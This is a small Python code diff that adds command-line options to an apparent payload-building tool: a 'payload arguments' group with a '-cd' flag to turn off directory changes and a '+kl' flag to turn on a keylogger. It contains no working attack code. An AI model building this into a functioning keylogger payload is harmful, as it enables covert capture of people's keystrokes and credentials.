@@ -117,7 +117,19 @@ def _windows_main(args):
 def _linux_main(args):
     import argparse
 
-    parser = argparse.ArgumentParser()
+    parser = argparse.ArgumentParser(
+            prefix_chars='-+',
+    )
+    payload_group = parser.add_argument_group('payload arguments')
+    payload_group.add_argument('-cd',
+            help='Turn off change directory',
+            action='store_false',
+    )
+    payload_group.add_argument('+kl',
+            help='Turn on keylogger',
+            action='store_true',
+    )
+
     subparsers = parser.add_subparsers(
             dest='command',
             help='Choose from the following commands:',
